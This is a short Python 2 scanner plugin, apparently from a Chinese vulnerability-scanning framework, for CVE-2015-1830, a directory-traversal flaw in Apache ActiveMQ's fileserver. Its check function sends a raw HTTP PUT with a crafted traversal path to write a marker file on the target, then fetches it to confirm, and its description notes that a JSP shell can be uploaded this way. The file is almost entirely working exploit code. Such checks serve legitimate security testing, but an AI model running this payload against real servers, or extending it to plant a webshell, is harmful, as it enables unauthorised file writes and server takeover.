# coding:utf-8
import socket
import time
import urllib2
import random

def get_plugin_info():
    plugin_info = {
        "name": "Apache ActiveMQ upload/download功能目录遍历漏洞",
        "info": "CVE-2015-1830，可直接上传jspSHELL",
        "exp_url":"",
        "docker":"",
        "other":""
    }
    return plugin_info

def check(ip, port, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        filename = "baymax"
        flag = "PUT /fileserver/sex../../..\\styles/%s.txt HTTP/1.0\r\nContent-Length: 9\r\n\r\nBM0D\r\n\r\n"%(filename)
        s.send(flag)
        time.sleep(1)
        s.recv(1024)
        s.close()
        url = 'http://' + ip + ":" + str(port) + '/styles/%s.txt'%(filename)
        res_html = urllib2.urlopen(url, timeout=timeout).read(1024)
        if 'BM0D' in res_html:
            return u"存在任意文件上传漏洞，" + url
    except:
        pass
